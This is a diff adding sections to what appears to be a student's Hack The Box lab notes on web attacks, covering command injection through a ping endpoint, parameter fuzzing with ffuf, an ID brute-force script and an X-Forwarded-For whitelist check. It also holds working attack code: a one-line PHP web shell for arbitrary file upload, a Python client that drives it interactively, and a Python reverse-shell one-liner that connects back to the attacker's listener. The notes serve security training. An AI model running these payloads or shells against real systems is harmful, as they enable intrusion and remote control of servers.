@@ -622,3 +622,92 @@ while True:
 python3 automate.py
 ```
 
+#### Command Injection
+http://<TARGET IP>:3003/ping-server.php/ping
+
+```bash
+curl http://<TARGET IP>:3003/ping-server.php/system/ls
+```
+
+#### Information Disclosure (w/ a twist of SQLi)
+
+```bash
+ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
+
+fuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
+
+curl http://<TARGET IP>:3003/?id=1
+[{"id":"1","username":"admin","position":"1"}]
+```
+
+```python
+import requests, sys
+
+def brute():
+    try:
+        value = range(10000)
+        for val in value:
+            url = sys.argv[1]
+            r = requests.get(url + '/?id='+str(val))
+            if "position" in r.text:
+                print("Number found!", val)
+                print(r.text)
+    except IndexError:
+        print("Enter a URL E.g.: http://<TARGET IP>:3003/")
+
+brute()
+
+```
+
+```bash
+python3 brute_api.py http://<TARGET IP>:3003
+```
+
+```php
+<?php
+$whitelist = array("127.0.0.1", "1.3.3.7");
+if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
+{
+    header("HTTP/1.1 401 Unauthorized");
+}
+else
+{
+  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
+}
+```
+
+#### Arbitrary File Upload
+
+```php
+<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
+```
+
+```python
+import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
+parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
+parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
+parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
+parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
+args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
+if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
+    parser.print_help() # shows help menu
+elif args.target and args.payload: # elif (if they both have values do some action)
+    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
+if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
+    os.system("clear") # clear the screen (linux)
+    while True: # starts a while loop (never ending loop)
+        try: # try statement
+            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
+            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
+            time.sleep(0.3) # waits 0.3 seconds during each request
+        except requests.exceptions.InvalidSchema: # error handling
+            print("Invalid URL Schema: http:// or https://")
+        except requests.exceptions.ConnectionError: # error handling
+            print("URL is invalid")
+```
+
+```bash
+python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
